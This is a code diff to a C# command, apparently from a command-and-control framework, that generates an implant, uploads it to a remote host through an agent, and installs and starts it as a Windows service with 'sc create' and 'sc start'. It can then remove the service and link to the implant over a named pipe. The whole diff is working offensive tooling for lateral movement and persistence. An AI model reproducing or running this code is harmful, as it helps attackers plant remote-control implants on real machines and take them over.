@@ -79,43 +79,45 @@ namespace Commander.Commands.Composite
 
             var payloadOptions = new ImplantConfig()
             {
+                //StoreImplant = false,
                 Architecture =  agent.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                 Endpoint = endpoint,
                 IsDebug = false,
                 IsVerbose = options.verbose,
                 //ServerKey = config.ServerConfig.Key,
-                //Type = ImplantType.Service,
+                Type = ImplantType.Service,
                 //InjectionDelay = options.injectDelay,
                 //IsInjected = options.inject,
-                InjectionProcess = options.injectProcess
+                //InjectionProcess = options.injectProcess
             };
 
             if (!string.IsNullOrEmpty(options.injectProcess))
                 payloadOptions.InjectionProcess = options.injectProcess;
 
             commander.WriteInfo($"[>] Generating Payload!");
-            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
-            if (pay == null)
+            var implant = commander.GeneratePayload(payloadOptions);
+            if (implant == null)
                 commander.WriteError($"[X] Generation Failed!");
             else
                 commander.WriteSuccess($"[+] Generation succeed!");
 
             commander.WriteLine($"Preparing to upload the file...");
 
-            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
+            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
             if (Path.GetExtension(fileName).ToLower() != ".exe")
                 fileName += ".exe";
 
             string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;
 
             agent.Echo($"Downloading file {fileName} to {path}");
-            agent.Upload(pay, path);
+            agent.Upload(Convert.FromBase64String(implant.Data), path);
             agent.Delay(1);
             agent.Echo($"Creating service");
             agent.Shell($"sc create {options.service} binPath= \"{path}\"");
             agent.Echo($"Starting service");
             agent.Shell($"sc start {options.service}");
 
+            agent.Delay(20);
             if (!options.inject)
             {
                 agent.Echo($"Removing service");
@@ -137,7 +139,7 @@ namespace Commander.Commands.Composite
 
             if (endpoint.Protocol == ConnexionType.NamedPipe)
             {
-                agent.Echo($"Linking to {endpoint}");
+                agent.Echo($"Linking to pipe://127.0.0.1:{options.pipe}");
                 var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
                 agent.Link(targetEndPoint);
             }
